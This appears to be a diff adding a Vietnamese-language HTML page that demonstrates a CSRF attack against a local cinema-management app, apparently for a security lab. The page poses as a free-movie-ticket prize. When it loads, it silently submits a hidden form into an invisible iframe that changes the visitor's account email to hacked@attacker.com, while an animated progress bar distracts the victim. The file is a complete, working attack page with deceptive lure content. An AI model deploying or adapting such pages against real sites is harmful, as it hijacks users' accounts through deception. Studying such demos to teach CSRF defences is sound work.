@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CinemaPlus — Ưu đãi đặc biệt dành cho bạn!</title>
+    <style>
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+      body {
+        font-family: "Segoe UI", Arial, sans-serif;
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+      }
+      .card {
+        background: rgba(255,255,255,0.05);
+        border: 1px solid rgba(255,255,255,0.15);
+        border-radius: 20px;
+        padding: 48px 40px;
+        max-width: 480px;
+        text-align: center;
+        backdrop-filter: blur(10px);
+      }
+      .logo {
+        font-size: 2rem;
+        font-weight: 800;
+        color: #e50914;
+        letter-spacing: -1px;
+        margin-bottom: 8px;
+      }
+      .logo span { color: #fff; }
+      .gift-icon { font-size: 4rem; margin: 16px 0; }
+      h1 {
+        font-size: 1.6rem;
+        font-weight: 700;
+        margin-bottom: 12px;
+        color: #ffd700;
+      }
+      p {
+        color: rgba(255,255,255,0.75);
+        font-size: 0.95rem;
+        line-height: 1.6;
+        margin-bottom: 24px;
+      }
+      .prize-box {
+        background: rgba(255,215,0,0.1);
+        border: 1px solid rgba(255,215,0,0.3);
+        border-radius: 12px;
+        padding: 16px 20px;
+        margin-bottom: 28px;
+      }
+      .prize-box p {
+        margin: 0;
+        color: #ffd700;
+        font-weight: 600;
+        font-size: 1rem;
+      }
+      .progress-bar {
+        width: 100%;
+        height: 6px;
+        background: rgba(255,255,255,0.1);
+        border-radius: 3px;
+        overflow: hidden;
+        margin-bottom: 12px;
+      }
+      .progress-fill {
+        height: 100%;
+        background: linear-gradient(90deg, #e50914, #ffd700);
+        border-radius: 3px;
+        width: 0%;
+        transition: width 2.5s ease;
+      }
+      #status-text {
+        font-size: 0.8rem;
+        color: rgba(255,255,255,0.5);
+        margin-bottom: 24px;
+      }
+      .btn {
+        display: inline-block;
+        background: #e50914;
+        color: #fff;
+        font-weight: 700;
+        font-size: 1rem;
+        padding: 14px 32px;
+        border-radius: 8px;
+        text-decoration: none;
+        opacity: 0;
+        transform: translateY(10px);
+        transition: opacity 0.4s ease, transform 0.4s ease, background 0.2s;
+      }
+      .btn:hover { background: #c40812; }
+      .btn.show { opacity: 1; transform: translateY(0); }
+      .fine-print {
+        margin-top: 20px;
+        font-size: 0.7rem;
+        color: rgba(255,255,255,0.25);
+      }
+    </style>
+  </head>
+  <body>
+    <!--
+      ╔══════════════════════════════════════════════════════╗
+      ║  CSRF ATTACK — cross-site form submit                ║
+      ║  Target: POST /api/theater-mgnt/customers/           ║
+      ║               myInfo/update-email-vuln               ║
+      ║  Weapon: hidden <iframe> + <form target="...">       ║
+      ║  Result: victim's email → hacked@attacker.com        ║
+      ║          victim stays on THIS page (sees no error)   ║
+      ╚══════════════════════════════════════════════════════╝
+    -->
+
+    <!-- iframe ẩn để submit form mà không navigate khỏi trang này -->
+    <iframe name="hidden-sink" style="display:none"></iframe>
+
+    <!-- Form tấn công — target vào iframe ẩn -->
+    <form
+      id="csrf-form"
+      action="http://localhost:8080/api/theater-mgnt/customers/myInfo/update-email-demo"
+      method="POST"
+      target="hidden-sink"
+      style="display:none"
+    >
+      <input type="hidden" name="email" value="hacked@attacker.com" />
+    </form>
+
+    <!-- UI ngụy trang — nạn nhân không nghi ngờ gì -->
+    <div class="card">
+      <div class="logo">Cinema<span>Plus</span></div>
+      <div class="gift-icon">🎁</div>
+      <h1>Chúc mừng! Bạn trúng thưởng</h1>
+
+      <div class="prize-box">
+        <p>🎬 2 vé xem phim cao cấp miễn phí</p>
+      </div>
+
+      <p>
+        Hệ thống đang xác nhận tài khoản của bạn để gửi mã voucher.
+        Vui lòng đợi trong giây lát...
+      </p>
+
+      <div class="progress-bar">
+        <div class="progress-fill" id="progress"></div>
+      </div>
+      <div id="status-text">Đang xác thực tài khoản...</div>
+
+      <a
+        href="http://localhost:3000/profile"
+        class="btn"
+        id="claim-btn"
+      >
+        Nhận voucher ngay →
+      </a>
+
+      <p class="fine-print">
+        Chương trình áp dụng đến hết tháng 4/2026. Mỗi tài khoản một lần.
+      </p>
+    </div>
+
+    <script>
+      // Bước 1: Submit form tấn công ngay khi trang load
+      // Browser sẽ tự động kèm cookie access_token (SameSite=None)
+      // Nạn nhân không thấy gì vì form submit vào iframe ẩn
+      window.addEventListener("load", function () {
+        document.getElementById("csrf-form").submit();
+      });
+
+      // Bước 2: Animate progress bar để trang trông hợp lý
+      setTimeout(function () {
+        document.getElementById("progress").style.width = "100%";
+      }, 100);
+
+      const steps = [
+        [600,  "Đang xác thực tài khoản..."],
+        [1200, "Kiểm tra lịch sử đặt vé..."],
+        [1900, "Xác nhận thành công!"],
+        [2500, "Voucher đã sẵn sàng 🎉"],
+      ];
+      steps.forEach(function ([delay, text]) {
+        setTimeout(function () {
+          document.getElementById("status-text").textContent = text;
+        }, delay);
+      });
+
+      // Bước 3: Hiện nút "Nhận voucher" — thực ra link về victim app
+      // Khi nạn nhân click → thấy email đã bị đổi
+      setTimeout(function () {
+        document.getElementById("claim-btn").classList.add("show");
+      }, 2800);
+    </script>
+  </body>
+</html>
